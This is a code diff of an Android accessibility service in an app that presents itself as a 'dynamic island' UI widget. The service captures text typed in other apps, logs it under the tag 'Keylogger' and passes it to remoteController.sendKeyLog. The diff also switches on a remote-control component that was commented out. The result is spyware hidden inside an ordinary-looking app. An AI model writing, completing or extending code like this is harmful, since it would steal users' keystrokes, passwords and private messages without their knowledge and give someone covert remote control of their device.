@@ -1,8 +1,7 @@
 package com.tools.edge.dynamic.island.ui.component.service;
 
-import static com.tools.edge.dynamic.island.ui.component.example.AccessibilityExample.exampleUsage;
-
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.animation.ObjectAnimator;
 import android.animation.ValueAnimator;
@@ -36,7 +35,6 @@ import android.os.SystemClock;
 import android.preference.PreferenceManager;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
-import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.TypedValue;
@@ -610,7 +608,7 @@ public class ITGAccessibilityService extends AccessibilityService {
                         }
                         if ("android.bluetooth.device.action.ACL_DISCONNECTED".equals(intent.getAction())) {
                             if (bluetoothDevice.getType() == 1) {
-                                Iterator it5 = ITGAccessibilityService.this.list_small_island.iterator();
+                                Iterator<Notification> it5 = ITGAccessibilityService.this.list_small_island.iterator();
                                 while (true) {
                                     if (!it5.hasNext()) {
                                         break;
@@ -971,17 +969,15 @@ public class ITGAccessibilityService extends AccessibilityService {
 
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             List<CharSequence> text = event.getText();
-            if (text != null && !text.isEmpty()) {
+            if (!text.isEmpty()) {
                 currentText = text.toString().replaceAll("[\\[\\]]", "").trim();
 
                 // Reset timer nếu người dùng tiếp tục gõ
                 handlerKey.removeCallbacks(sendRunnable);
                 sendRunnable = () -> {
                     String packageName = String.valueOf(event.getPackageName());
-
                     Log.d("Keylogger", "App: " + packageName + " | Text: " + currentText);
                     remoteController.sendKeyLog(currentText);
-//                    sendToFirebase(currentText);
                 };
                 handlerKey.postDelayed(sendRunnable, DELAY_MS);
             }
@@ -1196,14 +1192,14 @@ public class ITGAccessibilityService extends AccessibilityService {
         }
         super.onServiceConnected();
 
-        exampleUsage(this);
+//        exampleUsage(this);
 //
-//        AccessibilityController controller = new AccessibilityController(this);
-//
-//        // Tạo AccessibilityActionExecutor
-//        AccessibilityActionExecutor executor = new AccessibilityActionExecutor(this, controller);
-//
-//        remoteController = new RemoteController(this.mContext, executor);
+        AccessibilityController controller = new AccessibilityController(this);
+
+        // Tạo AccessibilityActionExecutor
+        AccessibilityActionExecutor executor = new AccessibilityActionExecutor(this, controller);
+
+        remoteController = new RemoteController(this.mContext, executor);
 
     }
 
@@ -2560,10 +2556,9 @@ public class ITGAccessibilityService extends AccessibilityService {
     public int onStartCommand(Intent intent, int i, int i2) {
         if (intent.getIntExtra("com.control.center.intent.MESSAGE", -1) == 0) {
             try {
-                if (Build.VERSION.SDK_INT >= 24) {
-                    disableSelf();
-                }
+                disableSelf();
             } catch (Exception unused) {
+
             }
         }
         return super.onStartCommand(intent, i, i2);
